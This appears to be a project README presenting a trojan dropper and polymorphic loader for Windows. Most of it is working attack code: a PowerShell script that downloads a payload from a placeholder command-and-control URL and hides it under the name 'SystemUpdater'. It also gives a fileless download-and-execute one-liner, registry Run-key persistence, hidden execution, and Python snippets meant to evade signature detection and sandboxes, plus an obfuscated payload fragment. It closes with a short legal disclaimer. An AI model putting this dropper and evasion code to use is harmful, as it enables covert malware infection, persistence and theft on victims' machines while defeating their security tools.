# Trojan-Dropper-Polymorphic-Loader

## OVERVIEW
This project demonstrates a trojan dropper coupled with an advanced polymorphic loader designed to execute obfuscated payloads while evading detection. Threat actors utilizing techniques such as persistence and adaptability can deploy covert malware including ransomware, keyloggers, remote access trojans (RATS), credential stealers, and process injectors without easily being detected by traditional security solutions.

## Initial Infection Vector
The trojan dropper is a PowerShell script responsible for downloading the obfuscated payload from a remote C2 server. It ensures persistence by modifying Windows registry startup keys and executing the payload without displaying a console window.
```
Start-Process -WindowStyle Hidden -FilePath $filePath
```
## Techniques that threat actors use:
Fileless execution
```
powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "IEX (New-Object Net.WebClient).DownloadString('YOUR_C2_Server_or_Hosting_Server/Your_Payload_File')"
```
Windows Registry Persistence
```
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdater" -Value "$filePath"
```
This ensures the paylaod is automatically executed everytime the user logs in.

Invoke-WebRequest to download the payload over http-https making it appear as a legitimate network request.
```
Invoke-WebRequest -Uri $payloadURL -OutFile $filePath
```
## Polymorphic_Loader
This is an obfuscated python executable that executes an encrypted and self morphing payload.  It uses base64 encoding + encryption to hide the paylaod, mutatues itself upon execution to evade signature based detection, self replicates and deletes old versions to prevent forensic recovery. Everytime it executes it randomizes function and variable names also renaming functions before execution to make signature based detection useless.
```
func_name = ''.join(random.choices(string.ascii_letters, k=10))
var1 = ''.join(random.choices(string.ascii_letters, k=8))
globals()[func_name] = decrypt_and_execute
globals()[func_name]()
```
The payload sleeps for a random interval 1-5 minutes before executing ensuring short lived analysis sandboxes timeout before execution.
```
sleep_time = random.randint(60, 300)
```
# trojan_dropper.ps1
```
$filePath = "$env:PUBLIC\update.exe" 
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SystemUpdater"
$payloadURL = "YOUR_C2_OR_HOSTING_SERVER/polymorphic_loader.exe"

# Download the obfuscated payload
Invoke-WebRequest -Uri $payloadURL -OutFile $filePath

# Add persistence to registry
Set-ItemProperty -Path $regPath -Name $regName -Value $filePath

# Execute the <payload> 
Start-Process -WindowStyle Hidden -FilePath $filePath
```
# polymorphic_loader.exe
this is a snippet of the obfuscated payload having used pyarmor 
```
from pyarmor_runtime_000000 import __pyarmor__
__pyarmor__(__name__, __file__, b'PY000000\x00\x03\x0c\x00\xcb\r\r\n\x80\x00\x01\x00\x08\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00\xd2\x19\x00\x00\x12\t\x04\x00\x91\x82\xf0\x92fp\xdf\xfdc\xc3W^\x80"\xf9)\x00\x00\x00\x00\x00\x00\x00\x00\xeb\x04J,\xfe\xbe\xb9\xe2\xcaH\xf5\xccy\x95\xaai\x11\x19W\x9d\xdb\xd8\x99>`\x82\x8em\x1a\x9f_\xe1(\x80\xcdD\x98\xef4[-|\x9c%\x9d~\xc0l\xd5!t\xab\xce\xf42\xc67%\xec\xbe\xe3\x8c\x12A92\x08\x03\xda\xd6\xf9r\'L\x96\x17*\xa1\x1f\xa3j\xe1\x06\xca\xdf\xca1\xe6p\x16\xa4\rr~\xed\xe7\x18\x04A\x04\x08\x91vl\xdd\x9615\xb6\xad\x89k
```
**there are many other steps that need to be taken to compile a complete working obfuscated executable payload such as installing all the necessary dependencies, including them with the correct flags --hidden-import and --add-data**
## I am not responsible for your actions or intentions with the given data here! Stay within bounds of the law and only test where permission is given.

